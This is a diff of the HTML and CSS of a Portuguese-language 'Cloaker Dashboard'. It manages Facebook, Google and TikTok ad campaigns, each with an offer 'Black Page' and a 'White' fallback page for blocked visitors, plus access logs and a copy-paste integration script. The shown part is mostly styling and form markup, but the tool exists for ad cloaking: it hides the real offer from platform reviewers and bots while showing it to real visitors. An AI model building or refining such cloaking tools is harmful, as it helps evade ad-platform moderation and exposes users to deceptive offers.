@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gerenciador - Cloaking Vercel</title>
+    <title>Cloaker Dashboard</title>
     <style>
         :root {
             --bg-color: #0f172a;
@@ -18,44 +18,36 @@
             --glass-bg: rgba(30, 41, 59, 0.7);
             --glass-border: rgba(255, 255, 255, 0.1);
         }
-        
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background-color: var(--bg-color);
             color: var(--text-primary);
             line-height: 1.5;
             min-height: 100vh;
             display: flex;
-            background-image: 
-                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.15) 0px, transparent 50%),
-                radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.15) 0px, transparent 50%);
+            background-image:
+                radial-gradient(at 0% 0%, rgba(59,130,246,0.15) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(16,185,129,0.15) 0px, transparent 50%);
             background-attachment: fixed;
         }
 
         .container {
             width: 100%;
-            max-width: 1000px;
+            max-width: 1100px;
             margin: 2rem auto;
             padding: 0 1rem;
             display: grid;
-            grid-template-columns: 260px 1fr;
+            grid-template-columns: 240px 1fr;
             gap: 2rem;
             align-items: start;
         }
 
-        @media (max-width: 768px) {
-            .container {
-                grid-template-columns: 1fr;
-            }
-        }
+        @media (max-width: 768px) { .container { grid-template-columns: 1fr; } }
 
-        /* Sidebar */
+        /* ── Sidebar ── */
         .sidebar {
             background: var(--glass-bg);
             backdrop-filter: blur(12px);
@@ -63,13 +55,15 @@
             border: 1px solid var(--glass-border);
             border-radius: 16px;
             padding: 1.5rem 1rem;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
+            position: sticky;
+            top: 2rem;
         }
 
         .sidebar-title {
-            font-size: 1.25rem;
+            font-size: 1.2rem;
             font-weight: 700;
-            margin-bottom: 2rem;
+            margin-bottom: 1.75rem;
             padding-left: 0.5rem;
             background: linear-gradient(135deg, #60a5fa, #a78bfa);
             -webkit-background-clip: text;
@@ -80,30 +74,21 @@
             display: block;
             width: 100%;
             text-align: left;
-            padding: 0.875rem 1rem;
+            padding: 0.8rem 1rem;
             background: transparent;
             border: none;
             color: var(--text-secondary);
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             font-weight: 500;
             cursor: pointer;
             border-radius: 8px;
             transition: all 0.2s ease;
-            margin-bottom: 0.5rem;
+            margin-bottom: 0.4rem;
         }
+        .nav-item:hover { background: rgba(255,255,255,0.05); color: var(--text-primary); }
+        .nav-item.active { background: var(--accent-color); color: white; box-shadow: 0 4px 12px rgba(59,130,246,0.3); }
 
-        .nav-item:hover {
-            background: rgba(255, 255, 255, 0.05);
-            color: var(--text-primary);
-        }
-
-        .nav-item.active {
-            background: var(--accent-color);
-            color: white;
-            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
-        }
-
-        /* Main Content */
+        /* ── Main ── */
         .main-content {
             background: var(--glass-bg);
             backdrop-filter: blur(12px);
@@ -112,338 +97,331 @@
             border-radius: 16px;
             padding: 2.5rem;
             min-height: 500px;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
         }
 
-        .tab-content {
-            display: none;
-            animation: fadeIn 0.4s ease-out forwards;
-        }
+        .tab-content { display: none; animation: fadeIn 0.35s ease-out forwards; }
+        .tab-content.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
 
-        .tab-content.active {
-            display: block;
-        }
+        h2 { font-size: 1.65rem; font-weight: 600; margin-bottom: 2rem; color: var(--text-primary); }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        h2 {
-            font-size: 1.75rem;
-            font-weight: 600;
-            margin-bottom: 2rem;
-            color: var(--text-primary);
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
+        /* ── Forms ── */
+        .form-group { margin-bottom: 1.25rem; }
         label {
             display: block;
-            margin-bottom: 0.5rem;
-            font-size: 0.875rem;
+            margin-bottom: 0.45rem;
+            font-size: 0.85rem;
             font-weight: 500;
             color: var(--text-secondary);
         }
-
         input[type="text"],
         input[type="password"],
-        input[type="url"] {
+        input[type="url"],
+        input[type="date"],
+        select {
             width: 100%;
-            padding: 0.875rem 1rem;
-            background: rgba(0, 0, 0, 0.25);
+            padding: 0.8rem 1rem;
+            background: rgba(0,0,0,0.25);
             border: 1px solid var(--border-color);
             border-radius: 8px;
             color: var(--text-primary);
             font-family: inherit;
-            font-size: 0.95rem;
-            transition: all 0.2s ease;
+            font-size: 0.9rem;
+            transition: all 0.2s;
         }
-
-        input:focus {
+        input:focus, select:focus {
             outline: none;
             border-color: var(--accent-color);
-            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
+            box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
         }
+        select option { background: var(--surface-color); }
+        input[type="date"]::-webkit-calendar-picker-indicator { filter: invert(0.6); cursor: pointer; }
 
+        /* ── Buttons ── */
         .btn {
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            padding: 0.875rem 1.75rem;
+            padding: 0.8rem 1.6rem;
             background: var(--accent-color);
             color: white;
             border: none;
             border-radius: 8px;
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: all 0.2s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
+        .btn:hover:not(:disabled) { background: var(--accent-hover); transform: translateY(-1px); box-shadow: 0 6px 12px rgba(59,130,246,0.3); }
+        .btn:active:not(:disabled) { transform: translateY(0); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        .btn:hover:not(:disabled) {
-            background: var(--accent-hover);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(59, 130, 246, 0.3);
-        }
-
-        .btn:active:not(:disabled) {
-            transform: translateY(0);
-        }
-        
         .btn-outline {
             background: transparent;
             border: 1px solid var(--border-color);
             color: var(--text-primary);
             box-shadow: none;
         }
-        
-        .btn-outline:hover:not(:disabled) {
-            background: rgba(255, 255, 255, 0.05);
-            border-color: var(--text-secondary);
-        }
+        .btn-outline:hover:not(:disabled) { background: rgba(255,255,255,0.05); border-color: var(--text-secondary); }
 
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
+        .btn-danger {
+            background: rgba(239,68,68,0.15);
+            border: 1px solid rgba(239,68,68,0.3);
+            color: #f87171;
+            box-shadow: none;
         }
+        .btn-danger:hover:not(:disabled) { background: rgba(239,68,68,0.25); }
 
+        .btn-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid var(--border-color);
+            border-radius: 7px;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            padding: 0;
+        }
+        .btn-icon:hover { background: rgba(255,255,255,0.1); color: var(--text-primary); }
+        .btn-icon.danger:hover { background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.3); color: #f87171; }
+
+        /* ── Alert ── */
         .alert {
             padding: 1rem 1.25rem;
             border-radius: 8px;
-            margin-bottom: 2rem;
-            font-size: 0.95rem;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
             display: none;
             align-items: center;
             gap: 0.5rem;
             animation: fadeIn 0.3s ease-out;
         }
+        .alert.success { background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.2); color: #34d399; display: flex; }
+        .alert.error   { background: rgba(239,68,68,0.1);  border: 1px solid rgba(239,68,68,0.2);  color: #f87171; display: flex; }
 
-        .alert.success {
-            background: rgba(16, 185, 129, 0.1);
-            border: 1px solid rgba(16, 185, 129, 0.2);
-            color: #34d399;
-            display: flex;
-        }
-
-        .alert.error {
-            background: rgba(239, 68, 68, 0.1);
-            border: 1px solid rgba(239, 68, 68, 0.2);
-            color: #f87171;
-            display: flex;
-        }
-
+        /* ── Code Block ── */
         .code-block {
             position: relative;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0,0,0,0.5);
             border-radius: 8px;
-            padding: 1.5rem;
+            padding: 1.25rem;
             overflow-x: auto;
             border: 1px solid var(--border-color);
-            margin-bottom: 1.5rem;
         }
-
         pre {
             margin: 0;
-            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
-            font-size: 0.875rem;
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
+            font-size: 0.82rem;
             color: #e2e8f0;
-            line-height: 1.6;
-        }
-
-        .status-text {
-            font-size: 0.9rem;
-            margin-top: 1rem;
-            color: var(--text-secondary);
-            min-height: 1.5rem;
-            font-weight: 500;
-        }
-        
-        .current-link-display {
-            background: rgba(0,0,0,0.25);
-            padding: 1.5rem;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-            margin-bottom: 2rem;
+            line-height: 1.65;
+            white-space: pre-wrap;
             word-break: break-all;
-            position: relative;
-            overflow: hidden;
         }
 
-        .current-link-display::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 4px; height: 100%;
-            background: var(--accent-color);
-        }
-        
-        .current-link-label {
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
+        /* ── Empty state ── */
+        .empty-state {
+            text-align: center;
+            padding: 4rem 2rem;
             color: var(--text-secondary);
-            margin-bottom: 0.5rem;
+        }
+        .empty-state h3 { font-size: 1.15rem; color: var(--text-primary); margin-bottom: 0.6rem; }
+        .empty-state p  { font-size: 0.9rem; margin-bottom: 1.5rem; }
+
+        /* ── Campaign Grid ── */
+        .campaigns-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+            gap: 1.25rem;
+        }
+
+        .campaign-card {
+            background: rgba(0,0,0,0.2);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.4rem;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .campaign-card:hover { border-color: rgba(59,130,246,0.4); box-shadow: 0 4px 16px rgba(0,0,0,0.25); }
+
+        .campaign-card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 1rem;
+            gap: 0.75rem;
+        }
+        .campaign-name { font-size: 0.95rem; font-weight: 600; margin-bottom: 0.4rem; line-height: 1.3; }
+
+        .platform-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.25rem;
+            padding: 0.18rem 0.55rem;
+            border-radius: 999px;
+            font-size: 0.7rem;
             font-weight: 600;
         }
-        
-        .current-link-value {
-            font-size: 1.15rem;
-            font-weight: 500;
-            color: var(--text-primary);
-        }
+        .platform-badge.facebook { background: rgba(24,119,242,0.15); color: #60a5fa; border: 1px solid rgba(24,119,242,0.3); }
+        .platform-badge.google   { background: rgba(234,67,53,0.15);  color: #f87171; border: 1px solid rgba(234,67,53,0.3); }
+        .platform-badge.tiktok   { background: rgba(255,0,80,0.12);   color: #fb7185; border: 1px solid rgba(255,0,80,0.3); }
 
-        /* Logs Tab */
-        .logs-toolbar {
-            display: flex;
-            gap: 0.75rem;
-            margin-bottom: 1.5rem;
-            flex-wrap: wrap;
-            align-items: center;
-        }
+        .campaign-card-menu { display: flex; gap: 0.4rem; flex-shrink: 0; }
 
-        .logs-table-wrapper {
-            overflow-x: auto;
+        .campaign-mini-stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 0.5rem;
+            margin: 0.9rem 0;
+        }
+        .mini-stat {
+            text-align: center;
+            padding: 0.55rem 0.3rem;
+            background: rgba(0,0,0,0.2);
             border-radius: 8px;
             border: 1px solid var(--border-color);
         }
+        .mini-stat.blue  { border-color: rgba(59,130,246,0.25);  background: rgba(59,130,246,0.04); }
+        .mini-stat.green { border-color: rgba(16,185,129,0.25);  background: rgba(16,185,129,0.04); }
+        .mini-stat.red   { border-color: rgba(239,68,68,0.25);   background: rgba(239,68,68,0.04); }
+        .mini-stat-val {
+            font-size: 1.2rem;
+            font-weight: 700;
+            line-height: 1;
+        }
+        .mini-stat.blue  .mini-stat-val { color: #60a5fa; }
+        .mini-stat.green .mini-stat-val { color: #34d399; }
+        .mini-stat.red   .mini-stat-val { color: #f87171; }
+        .mini-stat-lbl { font-size: 0.62rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-secondary); margin-top: 0.25rem; }
 
-        .logs-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 0.875rem;
+        .campaign-black-url {
+            font-size: 0.78rem;
+            color: var(--text-secondary);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            margin-bottom: 0.9rem;
         }
 
+        /* ── Platform Selector ── */
+        .platform-selector { display: flex; gap: 0.75rem; flex-wrap: wrap; }
+        .platform-option {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.7rem 1.1rem;
+            background: rgba(0,0,0,0.2);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-size: 0.9rem;
+            user-select: none;
+        }
+        .platform-option:hover { border-color: var(--accent-color); background: rgba(59,130,246,0.06); }
+        .platform-option.selected { border-color: var(--accent-color); background: rgba(59,130,246,0.12); color: white; }
+        .platform-option input[type="radio"] { display: none; }
+
+        /* ── Config Section ── */
+        .config-section {
+            background: rgba(0,0,0,0.15);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .config-section-title {
+            font-size: 0.78rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: var(--text-secondary);
+            margin-bottom: 1.25rem;
+        }
+
+        /* ── Logs ── */
+        .log-filters {
+            display: flex;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+            align-items: flex-end;
+            margin-bottom: 1.25rem;
+        }
+        .filter-group { display: flex; flex-direction: column; gap: 0.3rem; }
+        .filter-group label { margin-bottom: 0; }
+        .filter-group input,
+        .filter-group select { width: auto; }
+
+        .logs-table-wrapper { overflow-x: auto; border-radius: 8px; border: 1px solid var(--border-color); }
+        .logs-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
         .logs-table th {
             background: rgba(0,0,0,0.3);
             color: var(--text-secondary);
-            font-size: 0.75rem;
+            font-size: 0.72rem;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.05em;
-            padding: 0.75rem 1rem;
+            padding: 0.7rem 1rem;
             text-align: left;
             white-space: nowrap;
         }
-
         .logs-table td {
-            padding: 0.75rem 1rem;
+            padding: 0.7rem 1rem;
             border-top: 1px solid var(--border-color);
             color: var(--text-primary);
             vertical-align: middle;
             white-space: nowrap;
         }
-
-        .logs-table tr:hover td {
-            background: rgba(255,255,255,0.03);
-        }
+        .logs-table tr:hover td { background: rgba(255,255,255,0.025); }
 
         .badge {
             display: inline-flex;
             align-items: center;
-            gap: 0.3rem;
-            padding: 0.25rem 0.65rem;
+            gap: 0.25rem;
+            padding: 0.22rem 0.6rem;
             border-radius: 999px;
-            font-size: 0.75rem;
-            font-weight: 600;
-        }
-
-        .badge-green {
-            background: rgba(16, 185, 129, 0.15);
-            color: #34d399;
-            border: 1px solid rgba(16, 185, 129, 0.25);
-        }
-
-        .badge-red {
-            background: rgba(239, 68, 68, 0.15);
-            color: #f87171;
-            border: 1px solid rgba(239, 68, 68, 0.25);
-        }
-
-        .logs-empty {
-            text-align: center;
-            padding: 3rem;
-            color: var(--text-secondary);
-            font-size: 0.95rem;
-        }
-
-        .destination-cell {
-            max-width: 180px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            color: var(--text-secondary);
-            font-size: 0.82rem;
-        }
-
-        /* ── Overview / Stats ── */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 1rem;
-            margin-bottom: 1.75rem;
-        }
-        .stat-card {
-            background: rgba(0,0,0,0.2);
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: 1.25rem 1.5rem;
-        }
-        .stat-card-label {
             font-size: 0.72rem;
-            text-transform: uppercase;
-            letter-spacing: 0.06em;
-            color: var(--text-secondary);
-            margin-bottom: 0.4rem;
             font-weight: 600;
         }
-        .stat-card-value {
-            font-size: 2.1rem;
-            font-weight: 700;
-            line-height: 1;
-            margin-bottom: 0.25rem;
+        .badge-green { background: rgba(16,185,129,0.15); color: #34d399; border: 1px solid rgba(16,185,129,0.25); }
+        .badge-red   { background: rgba(239,68,68,0.15);  color: #f87171; border: 1px solid rgba(239,68,68,0.25); }
+
+        .logs-empty { text-align: center; padding: 3rem; color: var(--text-secondary); font-size: 0.9rem; }
+        .destination-cell { max-width: 160px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--text-secondary); font-size: 0.8rem; display: inline-block; }
+
+        /* ── Modal ── */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.75);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 1rem;
         }
-        .stat-card-sub { font-size: 0.78rem; color: var(--text-secondary); }
-        .stat-card.green { border-color: rgba(16,185,129,0.35); background: rgba(16,185,129,0.04); }
-        .stat-card.green .stat-card-value { color: #34d399; }
-        .stat-card.red   { border-color: rgba(239,68,68,0.35);  background: rgba(239,68,68,0.04); }
-        .stat-card.red   .stat-card-value { color: #f87171; }
-        .stat-card.blue  { border-color: rgba(59,130,246,0.35); background: rgba(59,130,246,0.04); }
-        .stat-card.blue  .stat-card-value { color: #60a5fa; }
-        .stat-section-title {
-            font-size: 0.78rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.06em;
-            color: var(--text-secondary);
-            margin: 1.5rem 0 0.9rem;
+        .modal {
+            background: var(--surface-color);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 2rem;
+            max-width: 720px;
+            width: 100%;
+            max-height: 85vh;
+            overflow-y: auto;
         }
-        .charts-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; }
-        .bar-row { display: flex; align-items: center; gap: 0.7rem; margin-bottom: 0.55rem; }
-        .bar-label {
-            flex: 0 0 195px;
-            font-size: 0.82rem;
-            color: var(--text-primary);
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .bar-track {
-            flex: 1;
-            height: 7px;
-            background: rgba(255,255,255,0.07);
-            border-radius: 99px;
-            overflow: hidden;
-        }
-        .bar-fill { height: 100%; border-radius: 99px; transition: width 0.45s ease; }
-        .bar-count {
-            flex: 0 0 30px;
-            text-align: right;
-            font-size: 0.78rem;
-            color: var(--text-secondary);
-            font-variant-numeric: tabular-nums;
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 1.25rem;
+            gap: 1rem;
         }
     </style>
 </head>
@@ -451,174 +429,128 @@
 
 <div class="container">
     <aside class="sidebar">
-        <div class="sidebar-title">Dashboard</div>
+        <div class="sidebar-title">Cloaker</div>
         <nav>
-            <button class="nav-item active" onclick="switchTab('overview')">📈 Overview</button>
-            <button class="nav-item" onclick="switchTab('config')">⚙️ Configuração</button>
-            <button class="nav-item" onclick="switchTab('mobile')">📱 Link Mobile</button>
-            <button class="nav-item" onclick="switchTab('script')">📋 Gerar Script</button>
-            <button class="nav-item" onclick="switchTab('logs')">📊 Logs</button>
+            <button class="nav-item active" data-tab="home" onclick="switchTab('home')">🏠 Home</button>
+            <button class="nav-item" data-tab="campaign" onclick="newCampaign()">➕ Nova Campanha</button>
+            <button class="nav-item" data-tab="logs" onclick="switchTab('logs')">📊 Logs</button>
+            <button class="nav-item" data-tab="config" onclick="switchTab('config')">⚙️ Configurações</button>
         </nav>
     </aside>
 
     <main class="main-content">
-        <!-- TAB OVERVIEW -->
-        <div id="tab-overview" class="tab-content active">
+
+        <!-- ══════════════ HOME ══════════════ -->
+        <div id="tab-home" class="tab-content active">
             <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:2rem;">
-                <h2 style="margin-bottom:0">Overview</h2>
-                <button type="button" class="btn btn-outline" onclick="loadOverview()" id="btnRefreshOverview" style="font-size:0.85rem;padding:0.6rem 1.2rem;">↻ Atualizar</button>
+                <h2 style="margin-bottom:0">Campanhas</h2>
+                <button class="btn" onclick="newCampaign()">+ Nova Campanha</button>
             </div>
-            <div id="overview-msg" class="alert"></div>
-
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-card-label">Total de visitas</div>
-                    <div class="stat-card-value" id="ov-total">—</div>
-                    <div class="stat-card-sub">Últimos 500 registros</div>
-                </div>
-                <div class="stat-card blue">
-                    <div class="stat-card-label">Taxa de aprovação</div>
-                    <div class="stat-card-value" id="ov-rate">—</div>
-                    <div class="stat-card-sub" id="ov-rate-sub">—</div>
-                </div>
-                <div class="stat-card green">
-                    <div class="stat-card-label">Aprovados</div>
-                    <div class="stat-card-value" id="ov-approved">—</div>
-                    <div class="stat-card-sub">Redirecionados para oferta</div>
-                </div>
-                <div class="stat-card red">
-                    <div class="stat-card-label">Bloqueados</div>
-                    <div class="stat-card-value" id="ov-blocked">—</div>
-                    <div class="stat-card-sub">Bots, desktop, idioma</div>
-                </div>
-            </div>
-
-            <div class="charts-grid">
-                <div>
-                    <div class="stat-section-title">Motivos de bloqueio</div>
-                    <div id="ov-reasons"><p style="color:var(--text-secondary);font-size:0.875rem">Clique em Atualizar.</p></div>
-                </div>
-                <div>
-                    <div class="stat-section-title">Dispositivos</div>
-                    <div id="ov-devices"><p style="color:var(--text-secondary);font-size:0.875rem">Clique em Atualizar.</p></div>
-                </div>
-            </div>
+            <div id="home-msg" class="alert"></div>
+            <div id="campaigns-grid" class="campaigns-grid"></div>
         </div>
 
-        <!-- TAB CONFIGURAÇÃO -->
-        <div id="tab-config" class="tab-content">
-            <h2>Configurações da API</h2>
-            <div id="config-msg" class="alert"></div>
-            
-            <form id="configForm" onsubmit="saveConfig(event)">
-                <div class="form-group">
-                    <label for="gh-token">GitHub Personal Access Token</label>
-                    <input type="password" id="gh-token" required placeholder="ghp_xxxxxxxxxxxxxxxxxxxx">
-                </div>
-                
-                <div class="form-group">
-                    <label for="gh-repo">Repositório</label>
-                    <input type="text" id="gh-repo" required placeholder="usuario/repositorio">
-                </div>
-                
-                <div class="form-group">
-                    <label for="gh-branch">Branch</label>
-                    <input type="text" id="gh-branch" value="main">
-                </div>
-                
-                <div class="form-group">
-                    <label for="gh-path">Caminho do arquivo</label>
-                    <input type="text" id="gh-path" value="api/filtrar.mjs">
-                </div>
-                
-                <div class="form-group">
-                    <label for="vercel-url">URL Base da Vercel</label>
-                    <input type="url" id="vercel-url" placeholder="https://meu-projeto.vercel.app">
-                </div>
-                
-                <button type="submit" class="btn">Salvar no LocalStorage</button>
-            </form>
-        </div>
+        <!-- ══════════════ CAMPANHA (criar / editar) ══════════════ -->
+        <div id="tab-campaign" class="tab-content">
+            <div style="display:flex;align-items:center;gap:1rem;margin-bottom:2rem;">
+                <button class="btn-icon" onclick="switchTab('home')" title="Voltar">←</button>
+                <h2 id="campaign-form-title" style="margin-bottom:0">Nova Campanha</h2>
+            </div>
+            <div id="campaign-msg" class="alert"></div>
+            <input type="hidden" id="campaign-id">
 
-        <!-- TAB LINK MOBILE -->
-        <div id="tab-mobile" class="tab-content">
-            <h2>Atualizar Link Mobile</h2>
-            <div id="mobile-msg" class="alert"></div>
-            
-            <div class="current-link-display">
-                <div class="current-link-label">Link Atual (ofertaBlack)</div>
-                <div class="current-link-value" id="currentLinkValue">Desconhecido. Clique em "Ler arquivo atual".</div>
+            <div class="form-group">
+                <label>Nome da Campanha</label>
+                <input type="text" id="campaign-name-input" placeholder="Ex: Facebook – Oferta Maio">
             </div>
 
             <div class="form-group">
-                <button type="button" class="btn btn-outline" onclick="readCurrentFile()" id="btnRead">Ler arquivo atual</button>
+                <label>Plataforma</label>
+                <div class="platform-selector">
+                    <label class="platform-option" onclick="selectPlatform('facebook')">
+                        <input type="radio" name="platform" value="facebook">
+                        <span>📘 Facebook</span>
+                    </label>
+                    <label class="platform-option" onclick="selectPlatform('google')">
+                        <input type="radio" name="platform" value="google">
+                        <span>🔍 Google</span>
+                    </label>
+                    <label class="platform-option" onclick="selectPlatform('tiktok')">
+                        <input type="radio" name="platform" value="tiktok">
+                        <span>🎵 TikTok</span>
+                    </label>
+                </div>
             </div>
-            
-            <hr style="border: 0; border-top: 1px solid var(--border-color); margin: 2rem 0;">
 
             <div class="form-group">
-                <label for="newMobileLink">Novo Link Mobile (Destino)</label>
-                <input type="url" id="newMobileLink" placeholder="https://nova-oferta.com/" oninput="checkUrlProtocol()">
-                <div id="url-warning" style="display: none; color: #eab308; font-size: 0.85rem; margin-top: 0.5rem; font-weight: 500;">⚠️ "https://" será adicionado automaticamente.</div>
+                <label>Link da Oferta (Black Page)</label>
+                <input type="url" id="campaign-black-input" placeholder="https://oferta.com">
             </div>
-            
-            <button type="button" class="btn" onclick="saveAndDeploy()" id="btnDeploy">Salvar e fazer deploy</button>
-            
-            <div class="status-text" id="deployStatus"></div>
-        </div>
-
-        <!-- TAB SCRIPT -->
-        <div id="tab-script" class="tab-content">
-            <h2>Script de Integração</h2>
-            <div id="script-msg" class="alert"></div>
-            <p style="color: var(--text-secondary); margin-bottom: 2rem; font-size: 0.95rem;">
-                Configure a URL de fallback se desejar, e copie o script abaixo para colar dentro do <code>&lt;head&gt;</code> ou no final do <code>&lt;body&gt;</code> do seu site de origem.
-            </p>
 
             <div class="form-group">
-                <label for="whiteUrl">URL White (Fallback Desktop) - Opcional</label>
-                <input type="url" id="whiteUrl" placeholder="https://meusite-seguro.com/" oninput="generateScript()">
+                <label>URL White — Fallback para bloqueados (opcional)</label>
+                <input type="url" id="campaign-white-input" placeholder="https://site-seguro.com">
             </div>
-            
-            <div class="code-block">
-                <pre id="scriptOutput">// Configure e salve a aba 'Configuração' primeiro.</pre>
+
+            <div style="display:flex;gap:0.75rem;flex-wrap:wrap;">
+                <button class="btn" onclick="saveCampaign()">Salvar Campanha</button>
+                <button class="btn btn-outline" onclick="switchTab('home')">Cancelar</button>
             </div>
-            
-            <button type="button" class="btn" onclick="copyScript()">Copiar Script</button>
+
+            <!-- Script gerado automaticamente ao salvar -->
+            <div id="campaign-script-section" style="display:none;margin-top:2.5rem;">
+                <hr style="border:0;border-top:1px solid var(--border-color);margin-bottom:2rem;">
+                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:0.75rem;flex-wrap:wrap;gap:0.5rem;">
+                    <h3 style="font-size:1.1rem;font-weight:600;">Script de Integração</h3>
+                    <button class="btn btn-outline" style="font-size:0.82rem;padding:0.5rem 1rem;" onclick="copyCampaignScript()">📋 Copiar</button>
+                </div>
+                <p style="color:var(--text-secondary);font-size:0.85rem;margin-bottom:1rem;">Cole dentro do <code>&lt;head&gt;</code> ou no final do <code>&lt;body&gt;</code> do site de origem.</p>
+                <div class="code-block">
+                    <pre id="campaign-script-output"></pre>
+                </div>
+            </div>
         </div>
 
-        <!-- TAB LOGS -->
+        <!-- ══════════════ LOGS ══════════════ -->
         <div id="tab-logs" class="tab-content">
             <h2>Logs de Acesso</h2>
             <div id="logs-msg" class="alert"></div>
 
-            <!-- Configuração Upstash -->
-            <div style="background: rgba(0,0,0,0.2); border: 1px solid var(--border-color); border-radius: 10px; padding: 1.5rem; margin-bottom: 2rem;">
-                <p style="font-size: 0.8rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: var(--text-secondary); margin-bottom: 1rem;">Credenciais Upstash Redis</p>
-                <div class="form-group">
-                    <label for="upstash-url">URL do Redis</label>
-                    <input type="url" id="upstash-url" placeholder="https://humane-ibex-137301.upstash.io">
+            <div class="log-filters">
+                <div class="filter-group">
+                    <label>Data</label>
+                    <input type="date" id="log-date-filter" onchange="applyLogFilters()">
                 </div>
-                <div class="form-group">
-                    <label for="upstash-token">Token</label>
-                    <input type="password" id="upstash-token" placeholder="Token do Upstash">
+                <div class="filter-group">
+                    <label>Campanha</label>
+                    <select id="log-campaign-filter" onchange="applyLogFilters()">
+                        <option value="all">Todas</option>
+                    </select>
                 </div>
-                <button type="button" class="btn" onclick="saveUpstashConfig()">Salvar credenciais</button>
+                <div class="filter-group">
+                    <label>Ação</label>
+                    <select id="log-action-filter" onchange="applyLogFilters()">
+                        <option value="all">Todas</option>
+                        <option value="approved">Aprovados</option>
+                        <option value="blocked">Bloqueados</option>
+                    </select>
+                </div>
+                <div style="display:flex;align-items:flex-end;gap:0.5rem;margin-left:auto;">
+                    <button class="btn" onclick="loadLogs()" id="btnFetchLogs">↻ Atualizar</button>
+                    <button class="btn btn-outline" onclick="clearLogs()" id="btnClearLogs">Limpar</button>
+                </div>
             </div>
 
-            <!-- Toolbar -->
-            <div class="logs-toolbar">
-                <button type="button" class="btn" onclick="fetchLogs()" id="btnFetchLogs">&#x21bb; Atualizar logs</button>
